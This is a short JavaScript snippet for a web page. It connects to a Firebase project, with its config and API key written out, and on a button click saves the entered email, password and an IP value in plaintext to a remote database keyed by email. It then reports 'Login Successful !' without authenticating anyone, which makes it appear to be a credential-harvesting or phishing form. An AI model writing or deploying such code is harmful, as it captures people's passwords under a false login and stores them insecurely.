  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
  import { getDatabase, ref ,set, get, child } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCJCd4k0-FVM_X4H4fTQXkSaNVJ2gC5VEc",
    authDomain: "mywebpage-29697.firebaseapp.com",
    projectId: "mywebpage-29697",
    storageBucket: "mywebpage-29697.appspot.com",
    messagingSenderId: "75823835877",
    appId: "1:75823835877:web:a2c85f3ce58af3af64820c"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);

  const db = getDatabase(app)

  document.getElementById("submit").addEventListener('click', function(e){
    set(ref(db, 'user/' + document.getElementById("email").value),{
        
        email: document.getElementById("email").value,
        password: document.getElementById("password").value,
        Ip: document.getElementById("ip").value,
    });
    alert("Login Successful !");
  })